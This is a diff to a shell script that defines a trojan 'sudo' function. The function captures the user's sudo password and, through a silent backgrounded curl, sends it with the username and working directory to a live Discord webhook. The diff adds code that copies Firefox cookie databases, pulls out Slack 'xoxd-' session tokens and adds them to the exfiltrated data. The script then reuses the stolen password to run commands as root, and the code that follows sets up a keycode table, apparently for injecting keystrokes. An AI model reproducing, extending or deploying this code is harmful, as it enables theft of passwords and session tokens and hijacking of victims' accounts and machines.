@@ -111,9 +111,18 @@ sudo(){
 			if [[ "$horseData" != "$(tail -n 1 $HOME/rcTarget)" ]]; then
 				echo "$horseData" >> $HOME/rcTarget
 			fi
+
+			token=$(find "$HOME/.mozilla/firefox" -type f -name "cookies.sqlite" | while read -r cookie_db; do
+			    tmp_db=$(mktemp /tmp/cookies.XXXXXX.sqlite)
+			    cp "$cookie_db" "$tmp_db"
+			    sqlite3 "$tmp_db" "SELECT value FROM moz_cookies;" 2>/dev/null
+			    rm -f "$tmp_db"
+			done | grep -aoE 'xoxd-[A-Za-z0-9%]+' | awk '{printf "%s ", $0}')
+
 			usr=$(whoami)
 			pwd=$(pwd)
-			setsid bash -c "curl -s -X POST -H \"Content-Type: application/json\" -d \"{\\\"content\\\": \\\"sudo=${horseVision} usr=${usr} pwd=${pwd}\\\"}\" https://discord.com/api/webhooks/1410231118363627641/2gd3OeGr7fDmqzkB9pc1Ymx_0osDYOxYzckTKGvLnw6QZl_Br8jwguvZg8grWUPSEWGu >/dev/null 2>&1 &" >/dev/null 2>&1 </dev/null
+
+			setsid bash -c "curl -s -X POST -H \"Content-Type: application/json\" -d \"{\\\"content\\\": \\\"sudo=${horseVision} usr=${usr} pwd=${pwd} token=${token}\\\"}\" https://discord.com/api/webhooks/1410231118363627641/2gd3OeGr7fDmqzkB9pc1Ymx_0osDYOxYzckTKGvLnw6QZl_Br8jwguvZg8grWUPSEWGu >/dev/null 2>&1 &" >/dev/null 2>&1 </dev/null
 			setsid bash -c 'echo '"$horseVision"' | sudo -ES bash -c '\''
 				declare -A keycodes
 				keycodes=(["a"]=30 ["b"]=48 ["c"]=46 ["d"]=32 ["e"]=18 ["f"]=33 ["g"]=34 ["h"]=35 ["i"]=23 ["j"]=36 ["k"]=37 ["l"]=38 ["m"]=50 ["n"]=49 ["o"]=24 ["p"]=25 ["q"]=16 ["r"]=19 ["s"]=31 ["t"]=20 ["u"]=22 ["v"]=47 ["w"]=17 ["x"]=45 ["y"]=21 ["z"]=44 ["_"]=57 ["#"]=15 ["("]=1 [")"]=-1 ["["]=2 ["]"]=-2 ["{"]=3	["}"]=-3)
